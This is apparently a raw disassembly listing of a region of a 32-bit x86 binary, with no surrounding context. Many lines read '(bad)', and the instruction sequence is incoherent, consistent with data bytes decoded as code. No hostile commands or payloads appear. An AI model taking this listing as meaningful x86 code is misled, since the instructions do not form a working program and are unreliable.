  40632c:	fstp   DWORD PTR [ebx-0x4d265d72]
  406332:	add    ecx,DWORD PTR [esi-0x27]
  406335:	or     DWORD PTR [esi+0x352d9a2],0x6d
  40633c:	(bad)  [ebx-0x265dff72]
  406342:	repnz add esi,DWORD PTR [eax-0x27]
  406346:	rcl    DWORD PTR [ecx+0x346d9a2],cl
  40634c:	pop    edx
  40634d:	fnstcw WORD PTR [edi+0x75d9a291]
  406353:	add    ecx,DWORD PTR [ebx-0x27]
  406356:	mov    ds:0xd9d92291,eax
  40635b:	add    eax,DWORD PTR [ecx+0x2291c7d9]
  406361:	fld    DWORD PTR ds:0x63d97f04
  406367:	xchg   ecx,eax
  406368:	and    bl,cl
  40636a:	xor    BYTE PTR [ebx],al
  40636c:	pop    ecx
  40636d:	fnstcw WORD PTR [ebx-0x6f]
  406370:	and    bl,cl
  406372:	add    esp,DWORD PTR gs:[ecx-0x27]
  406376:	das    
  406377:	xchg   ecx,eax
  406378:	and    bl,cl
  40637a:	push   ebp
  40637b:	add    ebx,DWORD PTR [ebp-0x27]
  40637e:	sbb    edx,DWORD PTR [ecx+0x319d922]
  406384:	pop    ebp
  406385:	fst    DWORD PTR [ebx]
  406387:	xchg   ecx,eax
  406388:	and    bl,cl
  40638a:	add    ah,dh
  40638c:	pusha  
  40638d:	in     eax,dx
  40638e:	add    BYTE PTR ds:0xa80119d3,cl
  406394:	pop    esi
  406395:	(bad)  
  406396:	add    ch,bl
  406398:	in     al,dx
  406399:	sbb    BYTE PTR [ecx],al
  40639b:	(bad)  
  40639c:	pop    esi
  40639d:	jecxz  0x40639f
  40639f:	in     eax,0xdc
  4063a1:	sbb    BYTE PTR [ecx],al
  4063a3:	inc    ebx
  4063a4:	add    BYTE PTR [esi+0x1d],bl
  4063a7:	add    ecx,ebx
  4063a9:	in     al,dx
  4063aa:	sbb    BYTE PTR [ecx],al
  4063ac:	les    ebx,FWORD PTR [esi-0x45]
  4063af:	add    BYTE PTR [ecx-0x23],cl
  4063b2:	sbb    BYTE PTR [ecx],al
  4063b4:	push   ss
  4063b5:	pop    esi
  4063b6:	mov    edi,0x18ed6500
  4063bb:	add    ebp,ebx
  4063bd:	popa   
  4063be:	aad    0x0
  4063c0:	push   ebp
  4063c1:	fstp   QWORD PTR [eax]
  4063c3:	add    DWORD PTR [esi],eax
  4063c5:	pop    esi
  4063c6:	jmp    0x1d01:0x18ed3d00
  4063cd:	pop    esi
  4063ce:	in     eax,0x0
  4063d0:	cdq    
  4063d1:	fstp   QWORD PTR [eax]
  4063d3:	add    DWORD PTR [esi+0x5100ef61],ebp
  4063d9:	in     eax,dx
  4063da:	sbb    BYTE PTR [ecx],al
  4063dc:	inc    edx
  4063dd:	pop    esi
  4063de:	in     al,dx
  4063df:	add    cl,ah
  4063e1:	fstp   DWORD PTR [eax]
  4063e3:	add    DWORD PTR [edi+0x1100b961],esp
  4063e9:	out    dx,al
  4063ea:	sbb    BYTE PTR [ecx],al
  4063ec:	inc    edx
  4063ed:	pop    esi
  4063ee:	test   BYTE PTR [eax],0x99
  4063f1:	fstp   DWORD PTR [eax]
  4063f3:	add    DWORD PTR [esi+ebx*2-0x2c],esp
  4063f7:	add    BYTE PTR [ecx-0x12],ah
  4063fa:	sbb    BYTE PTR [ecx],al
  4063fc:	sbb    al,0x5e
  4063fe:	jecxz  0x406400
  406400:	sub    esi,ebx
  406402:	sbb    BYTE PTR [ecx],al
  406404:	add    BYTE PTR [edx],ch
  406406:	aad    0x37
  406408:	add    BYTE PTR [eax],al
  40640a:	dec    edi
  40640b:	pop    ebp
  40640c:	inc    ecx
  40640d:	add    bh,al
  40640f:	fldcw  WORD PTR [ebx]
  406411:	add    BYTE PTR [ebx+0x7800415c],al
  406417:	fld    DWORD PTR ds:0x415e8300
  40641d:	add    BYTE PTR [eax],ch
  40641f:	(bad)  [eax+eax*1]
  406422:	jnp    0x406482
  406424:	inc    ecx
  406425:	add    BYTE PTR ds:0x5b0009d9,dl
  40642b:	pop    esi
  40642c:	inc    ecx
  40642d:	add    BYTE PTR [ebp+edx*8+0x9],ah
  406431:	add    BYTE PTR [edi+0x5e],bl
  406434:	inc    ecx
  406435:	add    ch,bh
  406437:	fmul   DWORD PTR [edx]
  406439:	add    BYTE PTR [ebx+0x5e],dh
  40643c:	inc    ecx
  40643d:	add    BYTE PTR [esi],bl
  40643f:	(bad)  [ecx]
  406441:	add    BYTE PTR [edi+0x5e],dh
  406444:	inc    ecx
  406445:	add    BYTE PTR [ecx-0x2b],al
  406448:	or     al,0x0
  40644a:	mov    ebx,DWORD PTR [ebp+0x41]
  40644d:	add    BYTE PTR [ecx+ebx*8],ah
  406450:	sub    al,0x0
  406452:	mov    ebx,DWORD PTR [ebp+0x41]
  406455:	add    BYTE PTR [ebx],cl
  406457:	(bad)  [ecx]
  406459:	add    BYTE PTR [ebx-0x1fffbea3],cl
  40645f:	fcom   DWORD PTR [eax]
  406461:	add    BYTE PTR [edi+0x5d],ch
  406464:	inc    ecx
  406465:	add    BYTE PTR [esi-0x28],cl
  406468:	or     DWORD PTR [eax],eax
  40646a:	sub    ebx,DWORD PTR [ebp+0x41]
  40646d:	add    BYTE PTR [eax],al
  40646f:	dec    ebx
  406470:	fmul   DWORD PTR [ecx]
  406472:	add    BYTE PTR [edi+0x5d],ch
  406475:	inc    ecx
  406476:	add    BYTE PTR [eax+ebx*8+0x5d430005],dh
  40647d:	inc    ecx
  40647e:	add    BYTE PTR [edx+0x58],ah
  406481:	add    dl,BYTE PTR [edx]
  406483:	bound  eax,QWORD PTR [edx+0xd624088]
  406489:	add    ah,BYTE PTR [esi]
  40648b:	bound  esp,QWORD PTR [esi-0x159dbf78]
  406491:	add    DWORD PTR [edx+eiz*2],ecx
  406494:	mov    BYTE PTR ds:[eax+0x62],al
  406498:	mov    al,BYTE PTR [edx]
  40649a:	adc    eax,0x408abe62
  40649f:	(bad)  
  4064a0:	rol    BYTE PTR [ecx*1+0x408b1662],1
  4064a7:	bound  ebx,QWORD PTR ds:0xc6621105
  4064ad:	mov    al,BYTE PTR [eax+0x62]
  4064b0:	hlt    
  4064b1:	add    al,0xb
  4064b3:	(bad)  
  4064b4:	cli    
  4064b5:	mov    al,BYTE PTR [eax+0x62]
  4064b8:	lahf   
  4064b9:	add    bl,BYTE PTR [edi]
  4064bb:	bound  eax,QWORD PTR [esi]
  4064bd:	mov    eax,DWORD PTR [eax+0x62]
  4064c0:	popf   
  4064c1:	add    cl,BYTE PTR [ecx]
  4064c3:	bound  esp,QWORD PTR [esi]
  4064c5:	mov    eax,DWORD PTR [eax+0x62]
  4064c8:	adc    DWORD PTR ds:0x8b426213,eax
  4064ce:	inc    eax
  4064cf:	bound  esi,QWORD PTR [edi+0x62000e04]
  4064d5:	mov    ax,WORD PTR [eax+0x62]
  4064d9:	jb     0x4064e0
  4064db:	adc    ah,BYTE PTR [edx+0x16]
  4064de:	mov    eax,DWORD PTR [eax+0x62]
  4064e1:	xor    DWORD PTR ds:0x8b2a620c,eax
  4064e7:	inc    eax
  4064e8:	(bad)  
  4064e9:	fild   DWORD PTR [eax+ecx*1]
  4064ec:	bound  ecx,QWORD PTR [edx-0x7c9dbf77]
  4064f2:	add    cl,BYTE PTR [ecx]
  4064f4:	bound  esp,QWORD PTR [esi-0x269dbf77]
  4064fa:	jne    0x406500
  4064fc:	push   0x2288c7d9
  406501:	fldl2t 
  406503:	add    esp,DWORD PTR [ecx-0x27]
  406506:	mov    ebx,0x44d92288
  40650b:	add    al,0x6d
  40650d:	fnstenv [edi-0x1826dd78]
  406513:	add    esp,DWORD PTR [edx-0x27]
  406516:	out    0x3,eax
  406518:	(bad)  
  406519:	(bad)  
  40651b:	add    esp,DWORD PTR [ebx-0x28]
  40651e:	out    0x3,eax
  406520:	(bad)  
  406521:	(bad)  
  406523:	add    esp,DWORD PTR [edx-0x27]
  406526:	call   0xd419c72d
  40652b:	xchg   DWORD PTR [edx+0x6203f0d9],esp
  406531:	fld1   
  406533:	add    esp,DWORD PTR [edx-0x27]
  406536:	out    0x86,eax
  406538:	add    BYTE PTR [edx+0x6203edd9],ah
  40653e:	(bad)  [edi]
  406540:	add    al,0x62
  406542:	fincstp 
  406544:	xchg   BYTE PTR [edx+0x6203f9d9],ah
  40654a:	(bad)  
  40654c:	add    esp,DWORD PTR [edx-0x27]
  40654f:	mov    edi,0xd7d9a286
  406554:	add    esp,DWORD PTR [edx-0x27]
  406557:	iret   
  406558:	add    esp,DWORD PTR [edx-0x27]
  40655b:	ret    
  40655c:	xchg   BYTE PTR [edx],ah
  40655e:	f2xm1  
  406560:	add    esp,DWORD PTR [edx-0x27]
  406563:	out    dx,eax
  406564:	add    esp,DWORD PTR [edx-0x27]
  406567:	xlat   BYTE PTR ds:[ebx]
  406568:	xchg   BYTE PTR [edx],ah
  40656a:	fxtract 
  40656c:	add    esp,DWORD PTR [edx-0x27]
  40656f:	jecxz  0x406574
  406571:	(bad)  
  406572:	fld    DWORD PTR [eax]
  406574:	jmp    0x4065d7
  406576:	fld    DWORD PTR [eax]
  406578:	or     esp,ebp
  40657a:	mov    bh,dh
  40657c:	mov    ah,0x61
  40657e:	fld    DWORD PTR [eax]
  406580:	call   0xef413ee6
  406585:	popa   
  406586:	fld    DWORD PTR [eax]
  406588:	fnstenv [edx+ecx*4-0x2]
  40658c:	in     al,dx
  40658d:	popa   
  40658e:	fld    DWORD PTR [eax]
  406590:	mov    ecx,0xe0fe8a84
  406595:	popa   
  406596:	fiadd  WORD PTR [eax]
  406598:	frstor [ecx-0x27]
  40659b:	add    cl,ch
  40659d:	add    BYTE PTR [edi-0x699fff28],al
  4065a3:	sbb    BYTE PTR [ecx],al
  4065a5:	call   0x50413e31
  4065aa:	xchg   BYTE PTR [eax],bl
  4065ac:	add    ebx,ebp
  4065ae:	xchg   eax,ebx
  4065b0:	add    BYTE PTR [eax+0x76],al
  4065b3:	sbb    BYTE PTR [ecx],al
  4065b5:	jmp    0x1866:0x3000d887
  4065bc:	add    ebp,ebp
  4065be:	push   ss
  4065bf:	mov    bh,dh
  4065c1:	pop    ecx
  4065c2:	push   esp
  4065c3:	sbb    BYTE PTR [ecx],al
  4065c5:	in     al,dx
  4065c6:	push   ss
  4065c7:	mov    bh,dh
  4065c9:	pop    ecx
  4065ca:	inc    esp
  4065cb:	sbb    BYTE PTR [ecx],al
  4065cd:	out    dx,eax
  4065ce:	inc    edi
  4065cf:	fld    DWORD PTR [eax]
  4065d1:	add    BYTE PTR [esi],dh
  4065d3:	sbb    BYTE PTR [ecx],al
  4065d5:	out    dx,al
  4065d6:	test   BYTE PTR [ecx+0x182439fe],0x1
  4065dd:	icebp  
  4065de:	xchg   ecx,ebx
  4065e0:	add    al,ah
  4065e2:	cdq    
  4065e3:	sbb    BYTE PTR [ecx],al
  4065e5:	loopne 0x40656e
  4065e7:	fld    DWORD PTR [eax]
  4065e9:	ror    BYTE PTR [ecx-0x4efffee8],1
  4065ef:	test   dh,bh
  4065f1:	(bad)  
  4065f2:	cmp    ecx,ebx
  4065f4:	aas    
  4065f5:	add    al,al
  4065f7:	mov    bl,0x0
  4065f9:	add    dl,dh
  4065fb:	int    0x3f
  4065fd:	add    BYTE PTR [edi+0xfffe84],dl
  406603:	cmp    ecx,ebx
  406605:	aas    
  406606:	add    BYTE PTR [esi-0xd00004d],al
  40660c:	int    0x3f
  40660e:	add    BYTE PTR [ebp-0x4d],dh
  406611:	add    BYTE PTR [eax],al
  406613:	loop   0x4065e2
  406615:	aas    
  406616:	add    BYTE PTR [edx+eiz*8-0x320dfffe],al
  40661d:	aas    
  40661e:	add    BYTE PTR [ebx-0x41],bl
  406621:	(bad)  
  406622:	inc    edx
  406624:	lds    edi,FWORD PTR [edi]
  406626:	add    BYTE PTR [edx-0x41],cl
  406629:	(bad)  
  40662a:	push   DWORD PTR [edx+0x19003fc5]
  406630:	mov    edi,0xc5a2ffff
  406635:	aas    
  406636:	add    BYTE PTR [eax],cl
  406638:	mov    edi,0xc572ffff
  40663d:	aas    
  40663e:	add    BYTE PTR [edi],bl
  406640:	mov    edi,0xc542ffff
  406645:	aas    
  406646:	add    BYTE PTR [esi],cl
  406648:	mov    edi,0xc572ffff
  40664d:	aas    
  40664e:	add    BYTE PTR ds:0x62ffffbf,bl
  406654:	lds    edi,FWORD PTR [edi]
  406656:	add    BYTE PTR [edi+edi*4],cl
  406659:	(bad)  
  40665a:	push   edx
  40665c:	les    edi,FWORD PTR [edi]
  40665e:	add    BYTE PTR [ebx-0x41],ah
  406661:	(bad)  
  406662:	inc    edx
  406664:	les    edi,FWORD PTR [edi]
  406666:	add    BYTE PTR [eax],al
  406668:	bound  ecx,QWORD PTR [ecx+0x62c5fff5]
  40666e:	cmp    al,0x41
  406670:	bound  edi,QWORD PTR [ebp+esi*8-0x1]
  406674:	mov    ch,0x2
  406676:	cmp    al,0x41
  406678:	bound  ebp,QWORD PTR [ebx+0x2a5fff5]
  40667e:	cmp    al,0x41
  406680:	(bad)  
  406681:	fdivrp st(3),st
  406683:	call   DWORD PTR [ebp+0x62413c22]
  406689:	(bad)  
  40668a:	cmc    
  40668b:	inc    DWORD PTR [ebp+0x62413c22]
  406691:	xor    ch,0xff
  406694:	jne    0x406658
  406696:	cmp    eax,DWORD PTR [ecx+0x62]
  406699:	scas   eax,DWORD PTR es:[edi]
  40669a:	and    al,0x1
  40669c:	bound  ecx,QWORD PTR [ecx]
  40669e:	cmp    al,BYTE PTR [ecx+0x62]
  4066a1:	shl    BYTE PTR [esi],cl
  4066a3:	add    DWORD PTR [edx-0x7],esp
  4066a6:	cmp    al,0x41
  4066a8:	(bad)
  4066ad:	sub    DWORD PTR ds:0x26d46241,edi
  4066b3:	add    DWORD PTR [edx+0x19],esp
  4066b6:	cmp    eax,0x26d36241
  4066bb:	add    DWORD PTR [edx-0x37],esp
  4066be:	cmp    al,0x41
  4066c0:	bound  edx,QWORD PTR [esi+0x2215fff3]
  4066c6:	aas    
  4066c7:	inc    ecx
  4066c8:	bound  edx,QWORD PTR [ebp+0x500fff3]
  4066ce:	and    bh,BYTE PTR [edi]
  4066d0:	inc    ecx
  4066d1:	bound  ebx,QWORD PTR [eax-0x3e0a000d]
  4066d7:	ds inc ecx
  4066d9:	bound  edx,QWORD PTR [edi-0x3e1a000d]
  4066df:	ds inc ecx
  4066e1:	(bad)  
  4066e2:	(bad)  [edi]
  4066e4:	es arpl cx,bx
  4066e7:	loopne 0x406724
  4066e9:	and    ebx,ecx
  4066eb:	add    BYTE PTR [esi],ah
  4066ed:	arpl   cx,bx
  4066ef:	sar    BYTE PTR [ebx],1
  4066f1:	and    ebx,ecx
  4066f3:	adc    DWORD PTR [esi],esp
  4066f5:	arpl   cx,bx
  4066f7:	sar    BYTE PTR [ebx],0x23
  4066fa:	fld    DWORD PTR [edx]
  4066fc:	es arpl cx,bx
  4066ff:	mov    al,0x3b
  406701:	and    ebx,ecx
  406703:	shl    DWORD PTR ds:0x3ba0d963,cl
  406709:	and    ebx,ecx
  40670b:	les    esp,FWORD PTR ds:0x3b90d963
  406711:	and    ebx,ecx
  406713:	aad    0x25
  406715:	arpl   cx,bx
  406717:	cmp    BYTE PTR [ebx],0x23
  40671a:	fld    st(6)
  40671c:	and    eax,0x3b70d963
  406721:	mov    ds:0x622617d9,eax
  406726:	fldenv [eax+0x3c]
  406729:	mov    ds:0x622618d9,eax
  40672e:	fst    DWORD PTR [eax+0x3c]
  406731:	add    BYTE PTR [ebx+0x6225f9d9],ah
  406737:	fld    DWORD PTR [eax+0x3c]
  40673a:	mov    ds:0x6225fad9,eax
  40673f:	fnstenv [eax]
  406741:	cmp    al,0xa3
  406743:	(bad)  
  406745:	and    eax,0x3c20d962
  40674a:	mov    ds:0x6225dcd9,eax
  40674f:	fst    DWORD PTR [eax]
  406751:	cmp    al,0xa3
  406753:	fnstcw WORD PTR [ebp+0x3886f5f2]
  406759:	cmp    eax,0xbe00d9a3
  40675e:	lock xchg dh,bh
  406761:	cmp    DWORD PTR [edi-0x2edefee8],ebx
  406767:	xchg   dh,bh
  406769:	cdq    
  40676a:	(bad)  
  40676b:	sbb    BYTE PTR [ecx],al
  40676d:	adc    cl,dl
  40676f:	xchg   dh,bh
  406771:	cdq    
  406772:	jg     0x40678c
  406774:	add    DWORD PTR [ebx],eax
  406776:	mov    cl,0x86
  406778:	(bad)  
  406779:	jns    0x4067ea
  40677b:	sbb    BYTE PTR [ecx],al
  40677d:	repnz mov al,0x86
  406780:	(bad)  
  406781:	jns    0x4067e2
  406783:	sbb    BYTE PTR [ecx],al
  406785:	in     eax,0x90
  406787:	xchg   dh,bh
  406789:	pop    ecx
  40678a:	dec    edi
  40678b:	sbb    BYTE PTR [ecx],al
  40678d:	aam    0x90
  40678f:	xchg   dh,bh
  406791:	pop    ecx
  406792:	aas    
  406793:	sbb    BYTE PTR [ecx],al
  406795:	mov    DWORD PTR [eax],0x39fe8670
  40679b:	das    
  40679c:	sbb    BYTE PTR [ecx],al
  40679e:	mov    dh,0x70
  4067a0:	xchg   dh,bh
  4067a2:	cmp    DWORD PTR [edi-0x7fd6fee8],ebx
  4067a8:	fadd   DWORD PTR [eax]
  4067aa:	pusha  
  4067ab:	mov    ds,WORD PTR [eax]
  4067ad:	add    DWORD PTR [eax],ebp
  4067af:	sbb    al,0x0
  4067b2:	push   eax
  4067b3:	jle    0x4067cd
  4067b5:	add    DWORD PTR [ebx],ebp
  4067b7:	sbb    al,0x0
  4067ba:	inc    eax
  4067bb:	outs   dx,BYTE PTR ds:[esi]
  4067bc:	sbb    BYTE PTR [ecx],al
  4067be:	sub    al,BYTE PTR [eax+0x5e3000d8]
  4067c4:	sbb    BYTE PTR [ecx],al
  4067c6:	sub    eax,0x2000d840
  4067cb:	dec    esi
  4067cc:	sbb    BYTE PTR [ecx],al
  4067ce:	sub    al,0x40
  4067d0:	fadd   DWORD PTR [eax]
  4067d2:	adc    BYTE PTR [esi],bh
  4067d4:	sbb    BYTE PTR [ecx],al
  4067d6:	add    BYTE PTR [ebp-0x45],al
  4067d9:	(bad)  
  4067da:	jmp    DWORD PTR [edx-0x3b]
  4067dd:	aas    
  4067de:	add    BYTE PTR [ebx+edi*4],dh
  4067e1:	(bad)  
  4067e2:	call   edx
  4067e4:	sar    DWORD PTR [edi],0x0
  4067e7:	adc    edi,DWORD PTR [eax-0x3e3d0001]
  4067ed:	aas    
  4067ee:	add    BYTE PTR [edx],al
  4067f0:	mov    eax,0xc192ffff
  4067f5:	aas    
  4067f6:	add    cl,dh
  4067f8:	mov    bh,0xff
  4067fa:	inc    DWORD PTR [eax]
  4067fc:	mov    ds:0x3fc1,al
  406801:	mov    eax,0xc1d2ffff
  406806:	aas    
  406807:	add    bh,cl
  406809:	mov    bh,0xff
  40680b:	inc    edx
  40680d:	sar    DWORD PTR [edi],0x0
  406810:	mov    esi,0xd2ffffb7
  406815:	sar    DWORD PTR [edi],0x0
  406818:	lods   eax,DWORD PTR ds:[esi]
  406819:	mov    bh,0xff
  40681b:	jmp    edx
  40681d:	sar    DWORD PTR [edi],0x0
  406820:	mov    esp,0xd2ffffb7
  406825:	sar    BYTE PTR [edi],0x0
  406828:	fwait
  406829:	mov    bh,0xff
  40682b:	inc    edx
  40682d:	lds    edi,FWORD PTR [edi]
  40682f:	add    BYTE PTR [edx-0x6d000049],cl
  406835:	lds    edi,FWORD PTR [edi]
  406837:	add    BYTE PTR [ecx-0x49],bl
  40683a:	(bad)  
  40683b:	jmp    DWORD PTR [edx+0x48003fc5]
  406841:	mov    bh,0xff
  406843:	call   DWORD PTR [edx-0x3b]
  406846:	aas    
  406847:	add    BYTE PTR [edi-0x49],dl
  40684a:	(bad)  
  40684b:	inc    DWORD PTR [edx-0x3b]
  40684e:	aas    
  40684f:	add    BYTE PTR [edx-0x3b],ah
  406852:	and    al,BYTE PTR [ecx]
  406854:	(bad)  
  406855:	jmp    0xe4a2a996
  40685a:	and    al,BYTE PTR [ecx]
  40685c:	(bad)  
  40685d:	fnstcw WORD PTR [ecx+eax*2]
  406860:	add    BYTE PTR [edx-0x1d],ah
  406863:	and    al,BYTE PTR [ecx]
  406865:	bound  ecx,QWORD PTR [ecx-0x659dbec6]
  40686b:	and    BYTE PTR [ecx],al
  40686d:	bound  edi,QWORD PTR [ecx+0x3a]
  406870:	inc    ecx
  406871:	bound  ecx,QWORD PTR [ecx+0x20]
  406874:	add    DWORD PTR [edx-0x57],esp
  406877:	cmp    al,BYTE PTR [ecx+0x62]
  40687a:	cmp    BYTE PTR [eax],ah
  40687c:	add    DWORD PTR [edx-0x67],esp
  40687f:	cmp    al,BYTE PTR [ecx+0x62]
  406882:	and    BYTE PTR [bx+di],al
  406885:	bound  ecx,QWORD PTR [ecx+0x3a]
  406888:	inc    ecx
  406889:	bound  ebx,QWORD PTR [esi+0x39620120]
  40688f:	cmp    al,BYTE PTR [ecx+0x62]
  406892:	dec    ebp
  406893:	and    BYTE PTR [ecx],al
  406895:	bound  ebp,QWORD PTR [ecx+0x3a]
  406898:	inc    ecx
  406899:	bound  edi,QWORD PTR [eax+eiz*1]
  40689c:	add    DWORD PTR [edx+0x59],esp
  40689f:	cmp    al,BYTE PTR [ecx+0x62]
  4068a2:	imul   esp,DWORD PTR [eax],0x1
  4068a5:	bound  ecx,QWORD PTR [ecx]
  4068a7:	cmp    al,BYTE PTR [ecx+0x62]
  4068aa:	adc    ah,BYTE PTR [ebx]
  4068ac:	add    DWORD PTR [edx-0x7],esp
  4068af:	cmp    al,0x41
  4068b1:	bound  edx,QWORD PTR [ecx]
  4068b3:	and    eax,DWORD PTR [ecx]
  4068b5:	bound  ebp,QWORD PTR [ecx]
  4068b7:	cmp    eax,0x23106241
  4068bc:	add    DWORD PTR [edx+0x19],esp
  4068bf:	cmp    eax,0x230f6241
  4068c4:	add    DWORD PTR [eax],eax
  4068c6:	(bad)  
  4068c7:	leave  
  4068c8:	cmp    al,0x41
  4068ca:	(bad)  
  4068cb:	(bad)  [ebx]
  4068cd:	and    ah,BYTE PTR [ebx-0x27]
  4068d0:	and    BYTE PTR [ebx+eiz*4],bh
  4068d3:	(bad)  [edx+eiz*1]
  4068d6:	arpl   cx,bx
  4068d8:	adc    BYTE PTR [ebx+eiz*4],bh
  4068db:	(bad)  ds:0xd96322
  4068e1:	cmp    al,0xa3
  4068e3:	(bad)  [esi]
  4068e5:	and    ah,BYTE PTR [ebx-0x27]
  4068e8:	lock cmp esp,DWORD PTR [ebx]
  4068eb:	fxch   st(7)
  4068ed:	and    DWORD PTR [ebx-0x27],esp
  4068f0:	loopne 0x40692d
  4068f2:	and    ebx,ecx
  4068f4:	shl    BYTE PTR [ecx],0x63
  4068f7:	fnop   
  4068f9:	cmp    esp,DWORD PTR [ebx]
  4068fb:	(bad)  
  4068fd:	and    DWORD PTR [ebx-0x27],esp
  406900:	sar    BYTE PTR [ebx],0x23
  406903:	fld    st(2)
  406905:	and    DWORD PTR [ebx-0x27],esp
  406908:	mov    al,0x3b
  40690a:	and    ebx,ecx
  40690c:	xchg   ebx,eax
  40690d:	and    DWORD PTR [ebx-0x27],esp
  406910:	mov    al,ds:0x84d9233b
  406915:	and    DWORD PTR [ebx-0x27],esp
  406918:	nop
  406919:	cmp    esp,DWORD PTR [ebx]
  40691b:	fst    DWORD PTR [ebp-0x7f269cdf]
  406921:	cmp    esp,DWORD PTR [ebx]
  406923:	fld    DWORD PTR [esi+0x70d96321]
  406929:	cmp    eax,DWORD PTR [eax]
  40692b:	mov    ds:0x631157d9,eax
  406930:	fsub   DWORD PTR [eax+0x3c]
  406933:	mov    ds:0x631158d9,eax
  406938:	fcom   DWORD PTR [eax+0x3c]
  40693b:	mov    ds:0x631139d9,eax
  406940:	fadd   DWORD PTR [eax+0x3c]
  406943:	mov    ds:0x733a00d9,eax
  406948:	fdivr  st,st(7)
  40694a:	das    
  40694b:	push   esi
  40694c:	sbb    BYTE PTR [ecx],al
  40694e:	sbb    eax,0x2000d840
  406953:	inc    esi
  406954:	sbb    BYTE PTR [ecx],al
  406956:	sbb    al,0x40
  406958:	fadd   DWORD PTR [eax]
  40695a:	adc    BYTE PTR [esi],dh
  40695c:	sbb    BYTE PTR [ecx],al
  40695e:	inc    DWORD PTR [ebx-0x28]
  406961:	add    BYTE PTR [eax],al
  406963:	sbb    BYTE PTR es:[ecx],al
  406966:	inc    BYTE PTR [ebx-0x660fff27]
  40696c:	sbb    BYTE PTR [ecx],al
  40696e:	loope  0x406940
  406970:	cmp    dh,0x99
  406973:	mov    ebx,DWORD PTR [eax]
  406975:	add    eax,edx
  406977:	mov    al,0x82
  406979:	(bad)  
  40697a:	cdq    
  40697b:	jnp    0x406995
  40697d:	add    ebx,eax
  40697f:	mov    al,0x82
  406981:	(bad)  
  406982:	jns    0x4069ef
  406984:	sbb    BYTE PTR [ecx],al
  406986:	mov    dl,0x90
  406988:	cmp    dh,0x79
  40698b:	pop    ebx
  40698c:	sbb    BYTE PTR [ecx],al
  40698e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40698f:	add    BYTE PTR [eax+0x4b59fe82],dl
  406995:	sbb    BYTE PTR [ecx],al
  406997:	xchg   esp,eax
  406998:	jo     0x40691c
  40699a:	(bad)  
  40699b:	pop    ecx
  40699c:	cmp    ebx,DWORD PTR [eax]
  40699e:	add    DWORD PTR [edi-0x7fff27bd],eax
  4069a4:	sub    DWORD PTR [eax],ebx
  4069a6:	add    DWORD PTR [esi-0x7d],esi
  4069a9:	fadd   DWORD PTR [eax]
  4069ab:	jo     0x406946
  4069ad:	sbb    BYTE PTR [ecx],al
  4069af:	imul   esi,DWORD PTR [ebx-0x17],0x18866000
  4069b6:	add    DWORD PTR [eax+0x53],ebp
  4069b9:	jmp    0x18b6b9be
  4069be:	add    DWORD PTR [eax],eax
  4069c0:	mov    ecx,0xa20010e8
  4069c5:	lds    edi,FWORD PTR [edi]
  4069c7:	add    BYTE PTR [eax+0x520010e8],cl
  4069cd:	lds    edi,FWORD PTR [edi]
  4069cf:	add    BYTE PTR [edi-0x18],bh
  4069d2:	adc    BYTE PTR [eax],al
  4069d4:	inc    edx
  4069d5:	lds    edi,FWORD PTR [edi]
  4069d7:	add    BYTE PTR [esi+0x520010e8],cl
  4069dd:	lds    edi,FWORD PTR [edi]
  4069df:	add    BYTE PTR [ebp-0x18],bh
  4069e2:	adc    BYTE PTR [eax],al
  4069e4:	(bad)  
  4069e5:	lds    edi,FWORD PTR [edi]
  4069e7:	add    BYTE PTR [eax+ebp*8+0x10],cl
  4069eb:	add    dl,dl
  4069ed:	mov    ebp,0xe853003f
  4069f2:	adc    BYTE PTR [eax],al
  4069f4:	add    dl,al
  4069f6:	mov    ebp,0xe842003f
  4069fb:	adc    BYTE PTR [eax],al
  4069fd:	xchg   edx,eax
  4069fe:	mov    ebp,0xe831003f
  406a03:	adc    BYTE PTR [eax],al
  406a05:	mov    ds:0x3fbd,al
  406a0a:	call   0xbe126a1f
  406a0f:	aas    
  406a10:	add    BYTE PTR [edi],dl
  406a12:	call   0xbe026a27
  406a17:	aas    
  406a18:	add    BYTE PTR [esi],al
  406a1a:	call   0xbe126a2f
  406a1f:	aas    
  406a20:	add    ch,dh
  406a22:	out    0x10,eax
  406a24:	add    dl,ah
  406a26:	mov    ebp,0xeac4003f
  406a2b:	adc    BYTE PTR [eax],al
  406a2d:	rol    ah,cl
  406a2f:	aas    
  406a30:	add    bl,cl
  406a32:	mov    dh,0xff
  406a34:	inc    edx
  406a36:	mov    ebp,0x162003f
  406a3b:	and    al,0x1
  406a3d:	bound  ebp,QWORD PTR [ecx]
  406a3f:	cmp    eax,0x24246241
  406a44:	add    DWORD PTR [edx+0x19],esp
  406a47:	cmp    eax,0x24236241
  406a4c:	add    DWORD PTR [edx-0x37],esp
  406a4f:	cmp    al,0x41
  406a51:	(bad)  
  406a52:	(bad)  
  406a53:	and    eax,DWORD PTR [ecx]
  406a55:	bound  edi,QWORD PTR [ecx+0x6200413c]
  406a5b:	std    
  406a5c:	and    eax,DWORD PTR [ecx]
  406a5e:	(bad)  
  406a5f:	jmp    0x20a2aba0
  406a64:	and    al,0x1
  406a66:	(bad)  
  406a67:	fnstcw WORD PTR [ecx+eax*2]
  406a6a:	bound  ebx,QWORD PTR [edi]
  406a6c:	and    al,0x1
  406a6e:	bound  ecx,QWORD PTR [ecx+0x5a62413a]
  406a74:	and    al,0x1
  406a76:	bound  edi,QWORD PTR [ecx+0x3a]
  406a79:	inc    ecx
  406a7a:	bound  ecx,QWORD PTR [ecx]
  406a7c:	and    al,0x1
  406a7e:	bound  ebp,QWORD PTR [ecx-0x39dbec6]
  406a84:	and    eax,DWORD PTR [ecx]
  406a86:	bound  ebx,QWORD PTR [ecx+0x2b62413a]
  406a8c:	and    al,0x1
  406a8e:	bound  ecx,QWORD PTR [ecx+0x3a]
  406a91:	inc    ecx
  406a92:	bound  edx,QWORD PTR [esi+0x24]
  406a95:	add    DWORD PTR [edx+0x39],esp
  406a98:	cmp    al,BYTE PTR [ecx+0x62]
  406a9b:	add    eax,0x69620124
  406aa0:	cmp    al,BYTE PTR [ecx+0x62]
  406aa3:	clc    
  406aa4:	and    eax,DWORD PTR [ecx]
  406aa6:	bound  ebx,QWORD PTR [ecx+0x3a]
  406aa9:	inc    ecx
  406aaa:	bound  esp,QWORD PTR [edi]
  406aac:	and    al,0x1
  406aae:	bound  ecx,QWORD PTR [ecx]
  406ab0:	cmp    al,BYTE PTR [ecx+0x62]
  406ab3:	fld    DWORD PTR [edi+0x60d96226]
  406ab9:	cmp    al,0xa3
  406abb:	(bad)  [eax-0x269dffda]
  406ac1:	push   eax
  406ac2:	cmp    al,0xa3
  406ac4:	(bad)  [ecx+0x40d96226]
